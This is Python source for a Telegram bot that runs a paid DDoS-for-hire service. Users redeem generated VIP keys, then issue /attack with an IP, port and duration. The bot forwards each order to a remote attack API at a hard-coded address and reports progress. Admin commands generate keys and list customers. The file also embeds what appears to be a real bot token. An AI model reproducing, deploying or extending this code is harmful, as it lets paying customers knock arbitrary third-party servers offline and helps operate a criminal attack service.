import telebot
import requests
import time
import random
import string
import json
import os
import threading

# --- CONFIGURATION ---
TOKEN = "8605810780:AAHpOMnTfgzviFfbHIk2du8S7tAJKseaNzY"
ADMIN_ID = 8787952549
API_BASE = "http://13.203.155.253/attack"
API_KEY_DDoS = "DESTRUCTED"

bot = telebot.TeleBot(TOKEN)

active_attacks = []
MAX_CONCURRENT = 2

def load_db(file):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_db("users.json")
keys = load_db("keys.json")

def send_attack_request(target, port, duration):
    try:
        response = requests.get(
            API_BASE, 
            params={"ip": target, "port": port, "time": duration, "key": API_KEY_DDoS},
            timeout=10
        )
        return response.status_code == 200
    except: return False

def update_progress(chat_id, msg_id, target, port, duration):
    start_time = time.time()
    success = send_attack_request(target, port, duration)
    
    if not success:
        bot.edit_message_text("❌ API ERROR: Attack failed to start.", chat_id, msg_id)
        global active_attacks
        active_attacks = [a for a in active_attacks if a['target'] != target]
        return

    while time.time() - start_time < duration:
        rem = int(duration - (time.time() - start_time))
        try:
            bot.edit_message_text(
                f"🚀 ATTACK ON: {target}:{port}\n⏳ TIME LEFT: {rem}s\n💥 POWERED BY SASTA DEVELOPER",
                chat_id, msg_id
            )
        except: break
        time.sleep(5)
    
    try: bot.edit_message_text(f"✅ COMPLETE: {target} finished.", chat_id, msg_id)
    except: pass
    active_attacks[:] = [a for a in active_attacks if a['target'] != target]

# --- HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    if uid not in users: users[uid] = {"expiry": 0, "username": uname}
    users[uid]["username"] = uname
    save_db("users.json", users)

    slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
    role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
    
    dashboard = (
        f"🚀 SASTA DEVELOPER TERMINAL\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 USER: {message.from_user.first_name}\n"
        f"💳 PLAN: {role}\n"
        f"🛰️ SLOTS: {slots}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛠️ COMMANDS: /attack, /running, /redeem, /myid\n"
        f"👑 OWNER: @sastadeveloper"
    )
    bot.send_message(message.chat.id, dashboard)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    uid = str(message.from_user.id)
    # No is_joined check anymore
    if users[uid]['expiry'] < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 VIP Plan Required to use attack."); return
    if len(active_attacks) >= MAX_CONCURRENT:
        bot.reply_to(message, "⚠️ ALL SLOTS FULL. Wait for an attack to finish."); return

    try:
        args = message.text.split()
        target, port, duration = args[1], args[2], int(args[3])
        active_attacks.append({"target": target, "end_time": time.time() + duration})
        msg = bot.send_message(message.chat.id, "🛰️ Sending Signal to API...")
        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
    except:
        bot.send_message(message.chat.id, "📝 Usage: /attack <IP> <PORT> <TIME>")

@bot.message_handler(commands=['running'])
def running(message):
    active_attacks[:] = [a for a in active_attacks if a['end_time'] > time.time()]
    if not active_attacks:
        bot.reply_to(message, "✨ No active attacks currently."); return
    txt = f"🔥 LIVE ATTACKS: {len(active_attacks)}/{MAX_CONCURRENT}\n\n"
    for a in active_attacks:
        txt += f"🚀 {a['target']} | {int(a['end_time'] - time.time())}s left\n"
    bot.send_message(message.chat.id, txt)

# --- ADMIN COMMANDS ---

@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        days, count = int(args[1]), int(args[2])
        new_keys = []
        for _ in range(count):
            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            keys[k] = {"duration": days * 86400, "used_by": None}
            new_keys.append(k)
        save_db("keys.json", keys)
        bot.send_message(message.chat.id, f"🎫 KEYS GENERATED:\n{chr(10).join(new_keys)}")
    except: bot.reply_to(message, "Usage: /genkey 1 5")

@bot.message_handler(commands=['keys'])
def show_keys(message):
    if message.from_user.id != ADMIN_ID: return
    if not keys: bot.reply_to(message, "No keys in database."); return
    txt = "🗝️ KEY DATABASE:\n"
    for k, v in keys.items():
        txt += f"{k} | {'Used by: '+v['used_by'] if v['used_by'] else '🆓 Unused'}\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['users'])
def show_users(message):
    if message.from_user.id != ADMIN_ID: return
    if not users: bot.reply_to(message, "No users in database."); return
    txt = "👥 USER DATABASE:\n"
    for uid, d in users.items():
        txt += f"{uid} | {d.get('username', 'NoName')}\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['redeem'])
def redeem(message):
    uid = str(message.from_user.id)
    try:
        k = message.text.split()[1]
        if k in keys and keys[k]['used_by'] is None:
            users[uid]['expiry'] = max(users.get(uid, {}).get('expiry', 0), time.time()) + keys[k]['duration']
            keys[k]['used_by'] = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
            save_db("users.json", users); save_db("keys.json", keys)
            bot.reply_to(message, "👑 VIP ACTIVATED SUCCESSFULLY!")
        else: bot.reply_to(message, "❌ Invalid or Already Used Key.")
    except: bot.reply_to(message, "Usage: /redeem <KEY>")

@bot.message_handler(commands=['myid'])
def myid(message):
    uid = str(message.from_user.id)
    exp = users.get(uid, {}).get("expiry", 0)
    rem = time.strftime('%Y-%m-%d %H:%M', time.localtime(exp)) if exp > time.time() else "EXPIRED"
    bot.reply_to(message, f"👤 YOUR ID: {uid}\n📅 EXPIRY: {rem}")

print("v10.5 NO-CHANNEL VERSION ONLINE...")
bot.infinity_polling()
